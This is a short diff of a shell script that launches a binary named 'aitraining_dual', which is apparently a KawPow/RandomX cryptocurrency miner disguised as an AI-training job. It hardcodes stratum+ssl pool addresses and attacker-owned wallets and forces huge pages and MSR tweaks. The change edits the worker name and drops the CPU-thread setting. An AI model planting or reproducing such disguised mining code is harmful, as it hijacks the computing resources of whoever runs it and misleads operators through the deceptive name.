@@ -12,9 +12,8 @@ exec ./aitraining_dual \
     --algorithm "kawpow;randomx" \
     --pool "stratum+ssl://51.89.99.172:16161;stratum+ssl://51.222.200.133:10343" \
     --wallet "RM2ciYa3CRqyreRsf25omrB4e1S95waALr;44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd" \
-    --worker "$WORKER;$WORKER" \
+    --worker "WORKER;WORKER" \
     --password "x;x" \
-    --cpu-threads "0;$CPU_THREADS" \
     --randomx-hugepages 1 \
     --randomx-use-1gb-pages 1 \
     --force-msr-tweaks 1 \
